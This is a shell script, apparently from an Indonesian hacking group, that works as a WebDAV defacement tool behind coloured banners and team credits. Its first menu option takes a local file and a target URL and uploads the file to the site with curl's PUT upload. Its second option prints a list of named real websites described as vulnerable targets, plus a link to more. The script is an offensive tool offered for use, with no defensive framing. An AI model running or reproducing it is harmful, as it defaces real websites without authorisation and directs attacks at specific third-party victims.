clear

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

figlet WEBDAV |lolcat

echo "|{×}==================================={×}|"|lolcat
echo "|Creator: ThuanTiggaBellass               |"|lolcat
echo "|-----------------------------------------|"|lolcat
echo "|Team   : 1.Hacker Cyber Indonesia        |"|lolcat
echo "|         2.BRANKEM218                    |"|lolcat
echo "|-----------------------------------------|"|lolcat
echo "|Thanks :> Hacker Indonesia_team          |"|lolcat
echo "|        > Anonymous Team                 |"|lolcat
echo "|        > C.L.A.Y TEam                   |"|lolcat
echo "|        > Moeslim Cyber Army             |"|lolcat
echo "|        > Team CIT                       |"|lolcat
echo "|{×}==================================={×}|"|lolcat
echo "langsung pilih mau apa"|lolcat
echo "___________________________________________________"|lolcat
echo ""
echo  $red    "1. WebDav"
echo "___________________________________________________"|lolcat
echo ""
echo  $blue   "2. Contoh Web Vuln "
echo "___________________________________________________"|lolcat
echo ""
echo "\033[34;1m
99\033[37;1m.\033[32;1mKeluar\033[37;1m"
echo ""
echo "\033[32;1m ──> \033[32;1m Pilih pilih aja gk usah.komen"
read -p " PILIHAN=> " pilih

if [ $pilih = 1 ]
then
clear
toilet "IZ4K412"
echo  "Masukin Sc nya lah tod {contoh:index.html}"|lolcat
read Sc
echo ""
echo "Link Website Target nya"|lolcat
read web
curl -T /sdcard/$Sc $web
echo $blue  $web/$Sc
fi

if [ $pilih = 2 ]
then
clear
toilet $red "IZ4K412"
echo "http://africaprop.co.za"
echo ""
echo "http://aaglcapetown2013.org.za"
echo ""
echo "findpersonnel.co.za"
echo ""
echo "http://www.ajaxfilebrowser.com"
echo ""
echo "http://shls001.com"
echo ""
echo "http://branch.prospec.co.th"
echo ""
echo "southernafricablog.com"
echo ""
echo $red "kurang.?"
echo $blue"nih buka website $purple https://aminkweb.blogspot.com/2017/11/kumpulan-web-vuln-webdav-terbaru.html?m=1"
fi
